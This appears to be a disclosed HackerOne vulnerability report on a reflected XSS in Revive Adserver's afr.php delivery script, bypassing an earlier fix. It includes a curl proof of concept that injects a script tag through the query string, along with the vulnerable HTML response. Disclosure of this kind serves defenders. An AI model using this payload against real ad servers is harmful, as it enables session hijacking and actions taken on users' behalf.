# Reflected XSS on /www/delivery/afr.php (bypass of report #775693)

## Report Details
- **Report ID**: 986365
- **URL**: https://hackerone.com/reports/986365
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-19T23:56:40.255Z
- **Disclosed**: 2021-01-19T15:30:37.986Z

## Reporter
- **Username**: axfla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: revive_adserver

## Vulnerability Information
It is possible to bypass the first fix of this XSS by closing the script tag, and then opening a new one. cURL PoC is trivial :

`curl "https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>"`

The response will be :

```
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>
<head>
<title>Advertisement</title>

    <script type='text/javascript'><!--// <![CDATA[
        setTimeout('window.location.replace("https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>&loc=")', 10000000);
    // ]]> --></script><noscript><meta http-equiv='refresh' content='10000;url=https://revive-instance/www/delivery/afr.php?refresh=10000&amp;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;loc='></noscript>
    <style type='text/css'>
body {margin:0; height:100%; background-color:transparent; width:100%; text-align:center;}
</style>
</head>
<body>

</body>
</html>

## Impact

An attacker can perform arbitrary actions on behalf of the victim.

## Attachments
No attachments
